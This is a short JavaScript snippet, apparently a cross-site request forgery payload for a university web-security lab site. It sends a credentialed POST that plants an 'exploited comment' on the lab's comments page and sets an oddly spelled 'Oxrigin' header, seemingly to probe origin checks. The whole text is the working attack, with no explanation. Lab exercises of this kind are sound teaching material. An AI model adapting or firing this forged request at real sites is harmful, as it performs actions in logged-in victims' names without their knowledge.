fetch("https://webappsec.cs.ut.ee/csrf/comments.php", {
  method: "Post",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
    "Oxrigin": "https://webappsec.cs.ut.ee"
  },
  body: "comment=exploited comment",
  credentials: "include"
})
